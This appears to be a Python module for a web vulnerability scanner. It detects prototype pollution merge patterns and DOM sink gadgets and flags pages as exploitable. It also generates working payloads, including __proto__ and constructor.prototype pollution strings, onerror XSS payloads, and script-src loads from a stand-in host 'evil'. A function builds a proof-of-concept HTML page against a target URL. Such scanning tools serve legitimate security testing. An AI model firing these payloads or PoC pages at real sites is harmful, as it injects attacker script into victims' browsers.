"""DOM Prototype Pollution -> XSS detection.

Prototype pollution occurs when an attacker can modify `Object.prototype`
or `Array.prototype` (typically via a vulnerable recursive merge /
`Object.assign` / deep-clone of attacker-controlled JSON).  Polluted
properties then propagate to every object in the application, frequently
reaching sinks that read from the prototype chain.

Vulnerable patterns:
  * Recursive merge that does not stop on `__proto__` / `constructor`.
  * `Object.assign({}, userJSON)` where userJSON contains `__proto__`.
  * `JSON.parse` of attacker input fed to a recursive extend/merge.

Sink gadgets that fire after pollution:
  * `obj.html` -> jQuery .html(obj) -> innerHTML sink.
  * `obj.src`  -> script src inheritance.
  * `obj.onload` -> inherited event handler.
  * `obj.toString` -> called by string concatenation sinks.
  * `obj.nodeType` -> jQuery isWindow/isNode gadget.
  * Trigger via `<script src=...?__proto__[src]=...>` query merge.

This module:
  1. Detects recursive merge patterns in inline/external scripts.
  2. Detects sink-gadget patterns that read inherited properties.
  3. Generates pollution payloads that reach known gadgets.
"""
from __future__ import annotations
import re

# Patterns that indicate a recursive merge / extend / deep-assign.
# These are the dangerous "pollution sources".
MERGE_PATTERNS: list[tuple[str, str]] = [
    (r'function\s+\w*\s*merge\s*\([^)]*\)\s*\{[^}]*for\s*\([^)]*in',
     "recursive merge function (for...in)"),
    (r'function\s+\w*\s*extend\s*\([^)]*\)\s*\{[^}]*for\s*\([^)]*in',
     "recursive extend function (for...in)"),
    (r'function\s+\w*\s*(?:deep)?[Cc]opy\s*\([^)]*\)\s*\{[^}]*for\s*\([^)]*in',
     "recursive deepCopy function (for...in)"),
    (r'function\s+\w*\s*deepMerge\s*\([^)]*\)\s*\{[^}]*for\s*\([^)]*in',
     "deepMerge function (for...in)"),
    (r'\$\s*\.\s*extend\s*\(\s*(?:true\s*,\s*)?\{',
     "jQuery $.extend(true, {}, userJSON) -- deep extend"),
    (r'Object\.assign\s*\(\s*\{\s*\}\s*,',
     "Object.assign({}, userJSON) -- shallow, but can hit __proto__ via setter"),
    (r'lodash.*merge\s*\(',
     "lodash.merge with attacker-controlled object"),
    (r'lodash.*set\s*\(\s*\w+\s*,\s*["\']__proto__',
     "lodash.set with __proto__ path (trivially polluting)"),
    (r'lodash.*set\s*\(\s*\w+\s*,\s*["\']constructor\.prototype',
     "lodash.set with constructor.prototype path"),
]

# Sink gadgets that read from the prototype chain after pollution.
# Each entry: (regex, gadget_name, payload_hint)
SINK_GADGETS: list[tuple[str, str, str]] = [
    (r'\$\s*\(\s*[^)]*\)\s*\.\s*html\s*\(\s*\w',
     "jQuery .html(obj) -- reads inherited `html` property",
     "__proto__[html]=<img src=x onerror=alert(1)>"),
    (r'\$\s*\(\s*[^)]*\)\s*\.\s*(?:append|prepend|after|before)\s*\(\s*\w',
     "jQuery DOM insertion gadget",
     "__proto__[<div>]=<img src=x onerror=alert(1)>"),
    (r'\.src\s*[\+\-\*\/]?=\s*\w',
     "Object .src assignment inherits polluted value",
     "__proto__[src]=//evil/x.js"),
    (r'\.href\s*[\+\-\*\/]?=\s*\w',
     "Object .href assignment inherits polluted value",
     "__proto__[href]=javascript:alert(1)"),
    (r'\.onload\s*=',
     "onload handler gadget",
     "__proto__[onload]=alert(1)"),
    (r'\.onerror\s*=',
     "onerror handler gadget",
     "__proto__[onerror]=alert(1)"),
    (r'isNode\s*\(\s*\w',
     "isNode gadget (polluted nodeType triggers jQuery branch)",
     "__proto__[nodeType]=1"),
    (r'isWindow\s*\(\s*\w',
     "isWindow gadget (polluted window property)",
     "__proto__[window]=1"),
    (r'document\.write\s*\(\s*\w',
     "document.write inherits polluted toString",
     "__proto__[toString]=function(){alert(1)}"),
    (r'JSON\.stringify\s*\(\s*\w',
     "JSON.stringify triggers polluted toJSON",
     "__proto__[toJSON]=function(){return '<img src=x onerror=alert(1)>'}"),
    # innerHTML sink fed by an object property read (e.g. data.html after a
    # recursive merge).  This is the canonical prototype-pollution -> XSS
    # gadget: the merge copies attacker JSON (including __proto__) onto a
    # clean object, then a sink reads obj.<key> which falls through to the
    # polluted prototype when <key> was not set on the instance itself.
    (r'\.innerHTML\s*=\s*\w+\s*\.\s*\w+',
     "innerHTML assignment from object property (inherits polluted value)",
     "__proto__[html]=<img src=x onerror=alert(1)>"),
    (r'\.outerHTML\s*=\s*\w+\s*\.\s*\w+',
     "outerHTML assignment from object property (inherits polluted value)",
     "__proto__[html]=<img src=x onerror=alert(1)>"),
    (r'insertAdjacentHTML\s*\(\s*[^,)]+\s*,\s*\w+\s*\.\s*\w+',
     "insertAdjacentHTML with object property (inherits polluted value)",
     "__proto__[html]=<img src=x onerror=alert(1)>"),
    (r'document\.write\s*\(\s*\w+\s*\.\s*\w+',
     "document.write with object property (inherits polluted toString)",
     "__proto__[toString]=<img src=x onerror=alert(1)>"),
    # Generic innerHTML/outerHTML assignment after a merge is suspicious
    # even without a property access (the merged object itself may be
    # stringified).  Lower confidence but worth flagging.
    (r'\.innerHTML\s*=\s*\w',
     "innerHTML assignment of merged data (potential pollution gadget)",
     "__proto__[html]=<img src=x onerror=alert(1)>"),
]

# Combined merge / sink regexes for fast scanning.
MERGE_RE = re.compile(
    "|".join("(?:%s)" % p[0] for p in MERGE_PATTERNS),
    re.IGNORECASE,
)
SINK_RE = re.compile(
    "|".join("(?:%s)" % g[0] for g in SINK_GADGETS),
    re.IGNORECASE,
)

# Patterns that indicate SAFE merge (already defends against pollution).
SAFE_MERGE_RE = re.compile(
    r'(?:__proto__|constructor\s*\[\s*["\']prototype["\']\s*\])\s*[!=]==|'
    r'hasOwnProperty\s*\(\s*["\']__proto__["\']\s*\)|'
    r'Object\.create\s*\(\s*null\s*\)',
    re.IGNORECASE,
)


def find_merge_patterns(html_or_js: str) -> list[dict]:
    """Find recursive merge / extend / deepCopy patterns.

    Returns: list of {
        "pattern": str,         # matched pattern
        "description": str,     # what was found
        "snippet": str,         # ~200 char context
    }
    """
    if not html_or_js:
        return []
    out = []
    for m in MERGE_RE.finditer(html_or_js):
        # Find which pattern matched
        for pat, desc in MERGE_PATTERNS:
            if re.search(pat, html_or_js[m.start():m.end()], re.IGNORECASE):
                start = max(0, m.start() - 60)
                end = min(len(html_or_js), m.end() + 200)
                out.append({
                    "pattern": pat,
                    "description": desc,
                    "snippet": html_or_js[start:end].strip()[:300],
                })
                break
    return out


def find_sink_gadgets(html_or_js: str) -> list[dict]:
    """Find sink gadgets that read inherited properties.

    Returns: list of {
        "gadget": str,
        "snippet": str,
        "payload_hint": str,
    }
    """
    if not html_or_js:
        return []
    out = []
    for m in SINK_RE.finditer(html_or_js):
        for pat, name, hint in SINK_GADGETS:
            if re.search(pat, html_or_js[m.start():m.end()], re.IGNORECASE):
                start = max(0, m.start() - 60)
                end = min(len(html_or_js), m.end() + 150)
                out.append({
                    "gadget": name,
                    "snippet": html_or_js[start:end].strip()[:300],
                    "payload_hint": hint,
                })
                break
    return out


def has_safe_merge(html_or_js: str) -> bool:
    """Whether the page uses a pollution-safe merge pattern."""
    return bool(SAFE_MERGE_RE.search(html_or_js or ""))


def analyze_page(html: str) -> dict:
    """Full prototype-pollution analysis of a page.

    Returns: {
        "has_merge": bool,             # recursive merge present
        "has_sink_gadget": bool,        # sink gadget present
        "has_safe_merge": bool,         # pollution-safe merge present
        "exploitable": bool,            # merge + sink, no safe merge
        "merges": list[dict],
        "sinks":  list[dict],
        "pollution_payloads": list[str], # payloads that reach the gadgets
    }
    """
    merges = find_merge_patterns(html)
    sinks = find_sink_gadgets(html)
    safe = has_safe_merge(html)
    exploitable = bool(merges) and bool(sinks) and not safe
    payloads = [g["payload_hint"] for g in sinks] if exploitable else []
    return {
        "has_merge": bool(merges),
        "has_sink_gadget": bool(sinks),
        "has_safe_merge": safe,
        "exploitable": exploitable,
        "merges": merges,
        "sinks": sinks,
        "pollution_payloads": payloads,
    }


def build_pollution_payloads() -> list[str]:
    """High-yield prototype pollution payloads."""
    return [
        # JSON body pollution (POST)
        '{"__proto__": {"src": "//evil/x.js"}}',
        '{"__proto__": {"onload": "alert(1)"}}',
        '{"__proto__": {"html": "<img src=x onerror=alert(1)>"}}',
        '{"__proto__": {"toString": "alert(1)"}}',
        # Query-param pollution (GET) -- depends on parser
        '__proto__[src]=//evil/x.js',
        '__proto__[onload]=alert(1)',
        '__proto__[html]=<img src=x onerror=alert(1)>',
        # constructor.prototype path
        'constructor[prototype][src]=//evil/x.js',
        'constructor[prototype][onload]=alert(1)',
    ]


def build_poc_html(target_url: str, payload: str = '__proto__[src]=//evil/x.js') -> str:
    """Build a PoC HTML that delivers a prototype pollution payload."""
    sep = "&" if "?" in target_url else "?"
    return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>Prototype Pollution -> XSS PoC</title></head>
<body>
<h2>Prototype Pollution -> XSS PoC</h2>
<p>Victim: <code>{target_url}</code></p>
<p>Pollution payload (delivered via query param):</p>
<pre>{payload}</pre>
<script>
  // Trigger the vulnerable merge by loading the URL with the payload.
  var x = new Image();
  x.src = "{target_url}{sep}{payload}";
</script>
</body></html>
"""
